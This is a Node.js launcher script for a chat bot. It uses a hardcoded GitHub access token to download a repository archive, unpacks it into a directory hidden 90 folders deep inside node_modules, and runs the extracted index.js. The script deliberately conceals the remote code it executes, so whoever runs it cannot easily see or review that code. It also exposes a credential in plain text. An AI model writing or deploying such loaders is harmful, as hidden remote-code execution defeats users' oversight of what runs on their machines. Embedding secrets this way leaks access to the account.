import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { spawn } from "child_process";
import chalk from "chalk";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');

// === GIT CONFIG ===
const GITHUB_TOKEN = "ghp_476Z6LU2U9wPswULDcLu3yRo5WeXfG3ilwz"; // ⚠️ Ne partage jamais ce token !
const GITHUB_REPO_INFO = {
  owner: "Ely304-jpg",
  repo: "test",
  ref: "main",
};

const LOCAL_SETTINGS = path.join(__dirname, "settingss.js");
let EXTRACT_DIR = null; // défini après extraction

// === HELPERS ===
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const countJSFiles = (dir) => {
  let count = 0;
  for (const file of fs.readdirSync(dir)) {
    const fullPath = path.join(dir, file);
    const stat = fs.statSync(fullPath);
    count += stat.isDirectory() ? countJSFiles(fullPath) : file.endsWith(".js") ? 1 : 0;
  }
  return count;
};

// === MAIN LOGIC ===
async function downloadAndExtract() {
  if (fs.existsSync(TEMP_DIR)) {
    console.log(chalk.yellow("🧹 Cleaning previous cache..."));
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }

  fs.mkdirSync(TEMP_DIR, { recursive: true });

  const zipPath = path.join(TEMP_DIR, "repo.zip");

  console.log(chalk.blue("⬇️ Connecting to GitHub API..."));

  const { owner, repo, ref } = GITHUB_REPO_INFO;

  const response = await axios({
    method: "GET",
    url: `https://api.github.com/repos/${owner}/${repo}/zipball/${ref}`,
    responseType: "stream",
    headers: {
      Authorization: `token ${GITHUB_TOKEN}`,
      Accept: "application/vnd.github.v3+json",
      "User-Agent": "INCONNU-XD"
    },
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);
    writer.on("finish", resolve);
    writer.on("error", reject);
  });

  console.log(chalk.green("📦 ZIP download complete. Extracting..."));
  const zip = new AdmZip(zipPath);
  zip.extractAllTo(TEMP_DIR, true);
  fs.unlinkSync(zipPath);

  // Trouver automatiquement le dossier extrait
  const folders = fs.readdirSync(TEMP_DIR).filter(f => {
    const full = path.join(TEMP_DIR, f);
    return fs.statSync(full).isDirectory();
  });

  if (!folders.length) {
    throw new Error("❌ Aucun dossier extrait trouvé !");
  }

  EXTRACT_DIR = path.join(TEMP_DIR, folders[0]);

  const pluginFolder = path.join(EXTRACT_DIR, "plugins");
  if (fs.existsSync(pluginFolder)) {
    const count = countJSFiles(pluginFolder);
    console.log(chalk.green(`✅ Plugins loaded: ${count} files.`));
  } else {
    console.log(chalk.red("❌ Plugin folder not found."));
  }
}

async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS) || !EXTRACT_DIR) return;

  try {
    const targetSettings = path.join(EXTRACT_DIR, "settingss.js");
    fs.copyFileSync(LOCAL_SETTINGS, targetSettings);
    console.log(chalk.green("🛠️ Local settings applied."));
  } catch (e) {
    console.error(chalk.red("❌ Failed to apply local settings."), e);
  }

  await delay(500);
}

function startBot() {
  if (!EXTRACT_DIR) {
    console.error(chalk.red("❌ ERREUR : Le dossier extrait est introuvable."));
    return;
  }

  console.log(chalk.cyan("🚀 Launching bot instance..."));
  const bot = spawn("node", ["index.js"], {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: process.env,
  });

  bot.on("close", (code) => {
    console.log(chalk.red(`💥 Bot terminated with exit code: ${code}`));
  });
}

// === RUN ===
(async () => {
  try {
    await downloadAndExtract();
    await applyLocalSettings();
    startBot();
  } catch (err) {
    console.error(chalk.red("❌ Une erreur s'est produite :"), err.message);
  }
})();
